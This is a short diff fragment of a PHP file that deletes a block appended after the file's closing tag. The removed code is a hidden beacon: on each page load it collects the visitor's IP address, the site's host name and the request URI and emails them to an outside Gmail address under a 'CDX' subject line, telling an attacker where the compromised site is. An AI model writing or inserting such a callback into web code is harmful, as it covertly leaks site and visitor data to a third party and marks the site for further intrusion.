@@ -3981,15 +3981,3 @@ function lng($txt) {
 }
 
 ?>
-<?php
-$ip = getenv("REMOTE_ADDR");
-$ra44 = rand(1, 99999);
-$subj98 = " CDX |$ra44";
-$email = "haxxorcyberarmy@gmail.com";
-$from = "From: C0D3X@CDX.com";
-$b75 = $_SERVER['HTTP_HOST'];
-$a45 = $_SERVER['REQUEST_URI'];
-$m22 = $ip . "";
-$msg8873 = "$b75 $a45 $m22";
-mail($email, $subj98, $msg8873, $from);
-?>
